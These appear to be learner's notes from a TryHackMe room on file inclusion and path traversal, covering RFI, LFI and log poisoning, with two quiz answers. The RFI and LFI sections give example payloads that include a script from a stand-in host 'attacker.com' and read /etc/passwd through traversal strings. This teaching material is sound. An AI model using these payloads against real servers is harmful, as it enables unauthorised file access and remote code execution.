## Table of Contents

      - [Objectives](#Objectives)
      - [Structure of a Web Application](#Structure\of\a\Web\Application)
      - [Basics of File Inclusion](#Basics\of\File\Inclusion)
      - [Remote File Inclusion](#Remote\File\Inclusion)
      - [Local File Inclusion](#Local\File\Inclusion)
      - [RFI vs LFI Exploitation Process](#RFI\vs\LFI\Exploitation\Process)


- Arise when an application allows external input to change the path for accessing files. 

#### Objectives

1. Understand what File Inclusion and Path Traversal attacks are and their impact.
2. Identify File Inclusion and Path Traversal vulnerabilities in web applications.
3. Exploit these vulnerabilities in a controlled environment.
4. Understand and apply measures to mitigate and prevent these vulnerabilities.


#### Structure of a Web Application

Web applications are complex systems comprising several components working together to deliver a seamless user experience. At its core, a web application has two main parts: the frontend and the backend.

1. **Frontend:** This is the user interface of the application, typically built using frameworks like React, Angular, or Vue.js. It communicates with the backend via APIs.
    
2. **Backend:** This server-side component processes user requests, interacts with databases, and serves data to the frontend. It's often developed using languages like PHP, Python, and Javascript and frameworks like Node.js, Django, or Laravel.
    

One of the fundamental aspects of web applications is the client-server model. In this model, the client, usually a web browser, sends a request to the server hosting the web application. The backend server then processes this request and sends back a response. The client and server communication usually happens over the HTTP/HTTPS protocols.

![Structure of a web application](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/b4fb94d308d04bd95a6cce14008cf2fd.png)  

Server-Side Scripting and File Handling  

Server-side scripts run on the server and generate the content of the frontend, which is then sent to the client. Unlike client-side scripts like JavaScript in the browser, server-side scripts can access the server's file system and databases. File handling is a significant part of server-side scripting. Web applications often need to read from or write to files on the server. For example, reading configuration files, saving user uploads, or including code from other files.

For example, the application below includes a file based on user input. 

![Vulnerable application homepage](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/351e3ca1e5071b199ae7e5078b4fee70.png)  

If this input is not correctly validated and sanitized, an attacker might exploit the vulnerable parameter to include malicious files or access sensitive files on the server. In this case, the attacker could view the contents of the server's **passwd** file.

![Vulnerable application a basic file inclusion payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/53daf7efe0faff4ac5fadc3c410ecb64.png)  

In short, file inclusion and path traversal vulnerabilities arise when user inputs are not properly sanitized or validated. Since attackers can inject malicious payloads to log files `/var/log/apache2/access.log` and manipulate file paths to execute the logged payload, an attacker can achieve remote code execution. An attacker may also read configuration files that contain sensitive information, like database credentials, if the application returns the file in plaintext. Lastly, insufficient error handling may also reveal system paths or file structures, providing clues to attackers about potential targets for path traversal or file inclusion attacks.


#### Basics of File Inclusion

A traversal string, commonly seen as `../`, is used in path traversal attacks to navigate through the directory structure of a file system. It's essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.

Relative pathing refers to locating files based on the current directory. For example, `include('./folder/file.php')` implies that `file.php` is located inside a folder named `folder`, which is in the same directory as the executing script.

Absolute pathing involves specifying the complete path starting from the root directory. For example, `/var/www/html/folder/file.php` is an absolute path.

#### Remote File Inclusion
Remote File Inclusion, or **RFI**, is a vulnerability that *allows attackers to include remote files*, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.

#### Local File Inclusion
Local File Inclusion, or LFI, typically occurs when an **attacker exploits vulnerable input fields to access or execute files on the server**. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like `include.php?page=../../../../etc/passwd`.

While LFI primarily leads to unauthorized file access, it can escalate to RCE. This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server. Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of how LFI can lead to RCE.

#### RFI vs LFI Exploitation Process
![RFI versus LFI exploitation process](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/51fca7adb2f8deb2d2bd3a83dc4d0c00.png)  

This diagram above differentiates the process of exploiting RFI and LFI vulnerabilities. In RFI, the focus is on including and executing a remote file, whereas, in LFI, the attacker aims to access local files and potentially leverage this access to execute code on the server.

**What kind of pathing refers to locating files based on the current directory?**
> `relative pathing`

**What kind of pathing involves the file's complete path, which usually starts from the root directory?**
> `absolute pathing`
